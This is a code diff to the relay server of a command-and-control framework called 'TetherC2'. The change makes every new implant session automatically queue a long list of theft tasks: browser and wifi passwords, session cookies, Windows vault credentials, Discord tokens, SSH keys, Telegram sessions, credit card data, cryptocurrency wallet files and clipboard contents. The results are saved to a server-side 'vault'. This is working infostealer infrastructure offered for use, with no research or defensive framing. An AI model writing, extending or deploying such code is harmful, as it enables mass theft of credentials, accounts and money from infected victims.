@@ -1,4 +1,4 @@
-# relay_server.py (Full Code - Corrected for Subdirectory Deployment)
+# relay_server.py (Full Code - Modified for Comprehensive Initial Harvest)
 import sys
 import os
 import sqlite3
@@ -8,9 +8,7 @@ import threading
 from flask import Flask, request, jsonify
 from werkzeug.security import generate_password_hash, check_password_hash
 
-# --- DEFINITIVE FIX for ModuleNotFoundError ---
-# This block adds the project's root directory to the Python path,
-# allowing it to find the 'database.py' module regardless of where this script is run from.
+# Add the project's root directory to the Python path
 sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
 from database import DatabaseManager
 
@@ -70,16 +68,36 @@ def handle_implant_hello():
                 db.save_vault_data(session_id, result["command"], result["output"])
     
     with cmd_lock:
-        # --- DEFINITIVE FIX FOR SMOOTH OPERATION ---
-        # Instead of a vague 'full_harvest', queue specific, important commands
-        # for a new session. This ensures the UI populates with data immediately.
+        # --- DEFINITIVE FIX FOR FULL DATA HARVEST ---
+        # When a session is new, queue every single data gathering command
+        # to ensure the UI is fully populated with all possible information.
         if is_new_session:
             initial_tasks = [
                 {"action": "system_info", "params": {}},
-                {"action": "network_info", "params": {}},
+                {"action": "hardware_info", "params": {}},
+                {"action": "security_products", "params": {}},
+                {"action": "installed_applications", "params": {}},
                 {"action": "running_processes", "params": {}},
+                {"action": "environment_variables", "params": {}},
+                {"action": "network_info", "params": {}},
+                {"action": "wifi_passwords", "params": {}},
+                {"action": "active_connections", "params": {}},
+                {"action": "arp_table", "params": {}},
+                {"action": "dns_cache", "params": {}},
+                {"action": "browser_passwords", "params": {}},
+                {"action": "session_cookies", "params": {}},
+                {"action": "windows_vault_credentials", "params": {}},
+                {"action": "application_credentials", "params": {}},
                 {"action": "discord_tokens", "params": {}},
-                {"action": "browser_files", "params": {}} # For decryption
+                {"action": "roblox_cookies", "params": {}},
+                {"action": "ssh_keys", "params": {}},
+                {"action": "telegram_session_files", "params": {}},
+                {"action": "credit_card_data", "params": {}},
+                {"action": "cryptocurrency_wallet_files", "params": {}},
+                {"action": "browser_autofill", "params": {}},
+                {"action": "browser_history", "params": {}},
+                {"action": "clipboard_contents", "params": {}},
+                {"action": "browser_files", "params": {}}  # Crucial for decryption
             ]
             command_queue.setdefault(c2_user, {}).setdefault(session_id, []).extend(initial_tasks)
             
@@ -92,6 +110,7 @@ def handle_implant_response():
     data = request.json; session_id = data.get("session_id")
     if not session_id: return jsonify({"status": "error", "message": "session_id missing"}), 400
     
+    owner = None
     with ses_lock:
         session_info = active_sessions.get(session_id)
         if session_info:
@@ -103,7 +122,7 @@ def handle_implant_response():
         # Save the response to the persistent database vault
         module_name = data.get("command")
         output_data = data.get("output")
-        if module_name and output_data:
+        if module_name and output_data is not None:
             db.save_vault_data(session_id, module_name, output_data)
             
         # Also queue it for the live C2 client
@@ -149,4 +168,6 @@ if __name__ == '__main__':
     # Use environment variable for port, defaulting to 5001, suitable for Render/Heroku
     port = int(os.environ.get('PORT', 5001))
     print(f"[RELAY] TetherC2 Relay is operational on port {port}.")
+    # For production, Gunicorn should be used instead of app.run()
+    # Example: gunicorn --worker-class gevent --bind 0.0.0.0:5001 relay_server:app
     app.run(host='0.0.0.0', port=port)
